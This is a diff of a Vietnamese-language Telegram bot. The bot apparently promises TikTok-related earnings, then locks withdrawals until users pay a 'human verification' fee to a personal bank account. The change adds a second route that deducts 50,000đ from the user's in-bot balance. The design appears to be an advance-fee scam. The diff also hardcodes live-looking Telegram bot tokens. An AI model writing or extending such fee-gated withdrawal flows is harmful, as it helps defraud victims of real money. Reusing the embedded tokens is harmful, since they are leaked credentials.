@@ -30,12 +30,13 @@ from telegram.ext import (
 # ============================================================
 # CẤU HÌNH
 # ============================================================
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8633360420:AAF1zW3XMH6sVjeALgBGMTPDrj6PsJ7jHE4") 
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8633360420:AAGtwrjyqRf32jnPXwwcwFCuHIHdtSaiyEU") 
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8207544772")) 
 KENH_YEU_CAU = os.getenv("KENH_YEU_CAU", "@thongbaoxutiktok")
 LINK_VIDEO = os.getenv("LINK_VIDEO", "https://vt.tiktok.com/ZSb6JTwaf/")
 RUT_TOI_THIEU = 50_000
 PHI_XAC_MINH = 30_000
+PHI_XAC_MINH_SO_DU = 50_000
 XAC_MINH_NGAN_HANG = os.getenv("XAC_MINH_NGAN_HANG", "ACB")
 XAC_MINH_CHU_TK = os.getenv("XAC_MINH_CHU_TK", "HA QUANG MINH")
 XAC_MINH_SO_TK = os.getenv("XAC_MINH_SO_TK", "25607451")
@@ -188,7 +189,8 @@ def init_db():
                 phi INTEGER NOT NULL,
                 thoi_gian TEXT NOT NULL,
                 status TEXT NOT NULL DEFAULT 'pending',
-                photo_file_id TEXT
+                photo_file_id TEXT,
+                phuong_thuc TEXT NOT NULL DEFAULT 'nap_30000'
             )
         """)
 
@@ -204,6 +206,13 @@ def init_db():
         try:
             conn.execute(
                 "ALTER TABLE verification_requests ADD COLUMN photo_file_id TEXT"
+            )
+        except sqlite3.OperationalError:
+            pass
+
+        try:
+            conn.execute(
+                "ALTER TABLE verification_requests ADD COLUMN phuong_thuc TEXT NOT NULL DEFAULT 'nap_30000'"
             )
         except sqlite3.OperationalError:
             pass
@@ -932,10 +941,8 @@ async def rut_bi_khoa_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     )
 
 
-async def xac_minh_nguoi_that_callback(
-    update: Update,
-    context: ContextTypes.DEFAULT_TYPE,
-):
+async def xac_minh_nguoi_that_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Hiển thị 2 phương thức xác minh: trừ số dư 50.000đ hoặc nạp 30.000đ."""
     query = update.callback_query
     await query.answer()
 
@@ -947,71 +954,164 @@ async def xac_minh_nguoi_that_callback(
         await query.answer("✅ Bạn đã được xác minh.", show_alert=True)
         return
 
+    await query.edit_message_text(
+        f"""🛡 <b>XÁC MINH NGƯỜI THẬT</b>
+
+
+Chọn một trong 2 phương thức:
+
+
+💰 <b>Phương thức 1 — Trừ số dư</b>
+• Trừ trực tiếp <b>{PHI_XAC_MINH_SO_DU:,}đ</b> trong số dư
+• Không cần gửi biên lai
+• Xác minh ngay nếu số dư đủ
+
+💳 <b>Phương thức 2 — Nạp tiền</b>
+• Chuyển khoản <b>{PHI_XAC_MINH:,}đ</b>
+• Gửi ảnh biên lai
+• Admin kiểm tra và duyệt thủ công
+
+⚠️ Chọn đúng phương thức trước khi thực hiện.""",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton(
+                f"💰 Trừ {PHI_XAC_MINH_SO_DU:,}đ từ số dư",
+                callback_data="xac_minh_so_du",
+            )],
+            [InlineKeyboardButton(
+                f"💳 Nạp {PHI_XAC_MINH:,}đ để xác minh",
+                callback_data="xac_minh_nap_30k",
+            )],
+            [InlineKeyboardButton("🏠 Menu chính", callback_data="ve_menu_chinh")],
+        ]),
+    )
+
+
+async def ve_menu_chinh_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    u = get_user(update.effective_user.id)
+    if not u:
+        return
+    await query.edit_message_text(
+        "🏠 <b>MENU CHÍNH</b>\n\nVui lòng chọn chức năng bên dưới.",
+        parse_mode="HTML",
+    )
+    await context.bot.send_message(
+        chat_id=u["id"],
+        text="Chọn chức năng:",
+        reply_markup=menu_chinh(u["id"]),
+    )
+
+
+async def xac_minh_bang_so_du_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Trừ 50.000đ trong số dư và xác minh ngay trong một transaction."""
+    query = update.callback_query
+    u = get_user(update.effective_user.id)
+    if not u:
+        await query.answer("❌ Không tìm thấy tài khoản.", show_alert=True)
+        return
+
+    if u.get("xac_minh_nguoi_that", 0):
+        await query.answer("✅ Bạn đã được xác minh.", show_alert=True)
+        return
+
+    with db() as conn:
+        conn.execute("BEGIN IMMEDIATE")
+        row = conn.execute(
+            "SELECT * FROM users WHERE id=?", (u["id"],)
+        ).fetchone()
+        if not row:
+            await query.answer("❌ Không tìm thấy tài khoản.", show_alert=True)
+            return
+        if row["xac_minh_nguoi_that"]:
+            await query.answer("✅ Bạn đã được xác minh.", show_alert=True)
+            return
+        if row["so_du"] < PHI_XAC_MINH_SO_DU:
+            await query.answer(
+                f"❌ Số dư không đủ. Cần {PHI_XAC_MINH_SO_DU:,}đ, hiện có {row['so_du']:,}đ.",
+                show_alert=True,
+            )
+            return
+
+        request_id = f"XMSD{row['id']}{int(time.time() * 1000)}"
+        conn.execute(
+            "UPDATE users SET so_du=so_du-?, xac_minh_nguoi_that=1 WHERE id=? AND so_du>=? AND xac_minh_nguoi_that=0",
+            (PHI_XAC_MINH_SO_DU, row["id"], PHI_XAC_MINH_SO_DU),
+        )
+        conn.execute(
+            """
+            INSERT INTO verification_requests
+            (request_id, user_id, ten, phi, thoi_gian, status, photo_file_id, phuong_thuc)
+            VALUES (?, ?, ?, ?, ?, 'approved', NULL, 'so_du_50000')
+            """,
+            (
+                request_id, row["id"], row["ten"], PHI_XAC_MINH_SO_DU,
+                now_vn().strftime("%d/%m/%Y %H:%M"),
+            ),
+        )
+        new_balance = row["so_du"] - PHI_XAC_MINH_SO_DU
+
+    await query.answer("✅ Xác minh thành công! Đã trừ 50.000đ.", show_alert=True)
+    await query.edit_message_text(
+        f"""🛡 <b>XÁC MINH THÀNH CÔNG</b>
+
+✅ Bạn đã xác minh người thật thành công.
+💰 Phí đã trừ: <b>{PHI_XAC_MINH_SO_DU:,}đ</b>
+💵 Số dư còn lại: <b>{new_balance:,}đ</b>
+
+🔓 Chức năng rút tiền đã được mở khóa.""",
+        parse_mode="HTML",
+        reply_markup=menu_chinh(row["id"]),
+    )
+
+
+async def xac_minh_nap_30k_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Tạo yêu cầu xác minh bằng cách nạp 30.000đ và gửi biên lai."""
+    query = update.callback_query
+    await query.answer()
+
+    u = get_user(update.effective_user.id)
+    if not u:
+        return ConversationHandler.END
+    if u.get("xac_minh_nguoi_that", 0):
+        await query.answer("✅ Bạn đã được xác minh.", show_alert=True)
+        return ConversationHandler.END
+
     with db() as conn:
         old = conn.execute(
-            """
-            SELECT * FROM verification_requests
-            WHERE user_id=? AND status='pending'
-            ORDER BY thoi_gian DESC
-            LIMIT 1
-            """,
+            """SELECT * FROM verification_requests
+               WHERE user_id=? AND status='pending' AND phuong_thuc='nap_30000'
+               ORDER BY thoi_gian DESC LIMIT 1""",
             (u["id"],),
         ).fetchone()
-
         if old:
             request_id = old["request_id"]
         else:
             request_id = f"XM{u['id']}{int(time.time() * 1000)}"
             conn.execute(
-                """
-                INSERT INTO verification_requests
-                (request_id, user_id, ten, phi, thoi_gian, status)
-                VALUES (?, ?, ?, ?, ?, 'pending')
-                """,
-                (
-                    request_id, u["id"], u["ten"], PHI_XAC_MINH,
-                    now_vn().strftime("%d/%m/%Y %H:%M"),
-                ),
+                """INSERT INTO verification_requests
+                   (request_id, user_id, ten, phi, thoi_gian, status, phuong_thuc)
+                   VALUES (?, ?, ?, ?, ?, 'pending', 'nap_30000')""",
+                (request_id, u["id"], u["ten"], PHI_XAC_MINH,
+                 now_vn().strftime("%d/%m/%Y %H:%M")),
             )
 
     context.user_data["dang_xac_minh"] = request_id
-
     await query.edit_message_text(
-        f"""🛡 <b>XÁC MINH NGƯỜI THẬT</b>
+        f"""💳 <b>XÁC MINH BẰNG NẠP TIỀN</b>
 
-💰 <b>Phí xác minh: {PHI_XAC_MINH:,}đ</b>
+💰 Số tiền: <b>{PHI_XAC_MINH:,}đ</b>
+🏦 Ngân hàng: <b>{h(XAC_MINH_NGAN_HANG)}</b>
+👤 Chủ TK: <b>{h(XAC_MINH_CHU_TK)}</b>
+🔢 Số TK: <code>{h(XAC_MINH_SO_TK)}</code>
+📝 Nội dung: <code>XACMINH {u['id']}</code>
 
-🏦 <b>THÔNG TIN CHUYỂN KHOẢN</b>
-Ngân hàng: <b>{h(XAC_MINH_NGAN_HANG)}</b>
-Chủ TK: <b>{h(XAC_MINH_CHU_TK)}</b>
-Số TK: <code>{h(XAC_MINH_SO_TK)}</code>
-
-💵 Số tiền: <b>{PHI_XAC_MINH:,}đ</b>
-📝 Nội dung CK: <code>XACMINH {u['id']}</code>
-
-📸 Sau khi chuyển khoản, hãy <b>gửi ảnh biên lai</b> tại đây.
-⏳ Admin sẽ kiểm tra giao dịch và duyệt thủ công.
-
-⚠️ Khoản phí phải được thanh toán đúng số tiền và đúng thông tin trên. Chức năng rút chỉ được mở sau khi Admin xác nhận.""",
+📸 Sau khi chuyển khoản, hãy gửi <b>ảnh biên lai</b> vào chat này.
+⏳ Admin sẽ kiểm tra và duyệt thủ công.""",
         parse_mode="HTML",
         reply_markup=menu_chinh(u["id"]),
     )
-
-    # Thông báo cho admin rằng có yêu cầu xác minh mới.
-    await context.bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"""🛡 <b>YÊU CẦU XÁC MINH NGƯỜI THẬT</b>
-
-🆔 ID: <code>{u['id']}</code>
-👤 Tên: {h(u['ten'])}
-💰 Phí: {PHI_XAC_MINH:,}đ
-📝 Nội dung CK: <code>XACMINH {u['id']}</code>
-📋 Mã: <code>{h(request_id)}</code>
-
-⏳ Đang chờ người dùng gửi biên lai.""",
-        parse_mode="HTML",
-    )
-
     return XAC_MINH_GUI_ANH
 
 
@@ -2318,6 +2418,10 @@ def build_application():
                 xac_minh_nguoi_that_callback,
                 pattern=r"^xac_minh_nguoi_that$",
             ),
+            CallbackQueryHandler(
+                xac_minh_nap_30k_callback,
+                pattern=r"^xac_minh_nap_30k$",
+            ),
         ],
         states={
             XAC_MINH_GUI_ANH: [
@@ -2328,6 +2432,23 @@ def build_application():
         per_user=True,
         per_chat=True,
         allow_reentry=True,
+    )
+
+    app.add_handler(
+        CallbackQueryHandler(
+            ve_menu_chinh_callback,
+            pattern=r"^ve_menu_chinh$",
+        ),
+        group=0,
+    )
+
+    # Xác minh: chọn phương thức / trừ số dư 50k.
+    app.add_handler(
+        CallbackQueryHandler(
+            xac_minh_bang_so_du_callback,
+            pattern=r"^xac_minh_so_du$",
+        ),
+        group=0,
     )
 
     # Callback Admin: duyệt đơn, xác minh, danh sách, duyệt tất cả.
